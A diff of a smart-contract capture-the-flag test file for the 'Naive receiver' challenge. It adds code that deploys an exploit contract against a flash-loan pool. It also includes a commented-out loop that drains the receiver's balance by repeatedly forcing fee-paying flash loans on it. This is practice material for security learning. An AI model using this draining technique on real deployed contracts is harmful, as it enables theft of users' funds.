@@ -31,6 +31,26 @@ describe('[Challenge] Naive receiver', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */   
+        const SingleTransactionExploitFactory = await ethers.getContractFactory('NaiveReceiverSingleTransactionExploit', attacker);
+        const exploit = await SingleTransactionExploitFactory.deploy(this.pool.address,this.receiver.address)
+       // const attackTx = await exploit.attack(this.pool.address,this.receiver.address)
+
+              /**
+       let balance = 1
+       let fee = 1
+       let counter = 0
+       console.log("Starting challenge")
+ while(balance >= fee)   {
+       const flashLoanTx  =  await this.pool.flashLoan(this.receiver.address,10)
+       balance = await ethers.provider.getBalance(this.receiver.address)
+       console.log(balance .toString())
+       counter++
+       if (counter>13) {
+     console.log("Ran 13 times")
+      break
+}
+}
+*/
     });
 
     after(async function () {
